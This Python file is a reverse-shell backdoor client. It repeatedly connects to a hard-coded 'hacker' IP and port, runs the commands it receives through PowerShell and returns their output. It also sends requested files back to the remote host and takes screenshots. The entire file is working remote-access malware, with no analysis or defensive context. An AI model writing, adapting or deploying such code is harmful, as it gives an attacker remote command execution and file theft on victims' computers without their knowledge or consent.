import socket
import subprocess
import time
import os
import pyautogui

IDENTIFIER = "<END_OF_COMMAND_RESULT>"
eof_identifier = "<END_OF_FILE_IDENTIFIER>"
CHUNK_SIZE = 2048


if __name__ == "__main__":
    

    hacker_IP = "192.168.74.128"
    hacker_port = 8008
    hacker_address = (hacker_IP, hacker_port)
    
    while True:
        try:
            
            victim_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                
            print("trying to connect with ", hacker_address)
            victim_socket.connect(hacker_address)
            while True:    
                data = victim_socket.recv(1024)

                hacker_command = data.decode()
                print("hacker command = ", hacker_command)
                if hacker_command == "stop":
                    break
                elif hacker_command == "":
                    continue
                elif hacker_command.startswith("cd"):
                    path2move = hacker_command.strip("cd ")
                    if os.path.exists(path2move):
                        os.chdir(path2move)
                    else:
                        print("cant change dir to ", path2move)
                    continue
                elif hacker_command.startswith("download"):
                    file_to_download = hacker_command.strip("download ")
                    if os.path.exists(file_to_download):
                        exists = "yes"
                        victim_socket.send(exists.encode())

                        with open(file_to_download, "rb") as file:
                            chunk = file.read(CHUNK_SIZE)

                            while len(chunk) > 0:
                                victim_socket.send(chunk)
                                chunk = file.read(CHUNK_SIZE)
                                # This will run till the end of file.

                            # once the file is complete, we need to send the marker.
                            victim_socket.send(eof_identifier.encode())
                        print("File sent successfully")

                    else:
                        exists = "no"
                        print("File doesn't exist")
                        victim_socket.send(exists.encode())
                        continue     
                elif hacker_command == "screenshot":
                    print("Taking screenshot")
                    screenshot = pyautogui.screenshot()
                    screenshot.save("screenshot.png")
                    print("screenshot saved")

                else:
                    output = subprocess.run(["powershell.exe", hacker_command], shell=True, capture_output=True, stdin=subprocess.DEVNULL)
                    if output.stderr.decode("utf-8") == "":
                        command_result = output.stdout
                        command_result = command_result.decode("utf-8") + IDENTIFIER
                        command_result = command_result.encode("utf-8")
                    else:
                        command_result = output.stderr
                    
                    victim_socket.sendall(command_result)
        except KeyboardInterrupt:
            print("exiting")
        except Exception as err:
            print("Unable to connect: ", err)
            time.sleep(5)
        
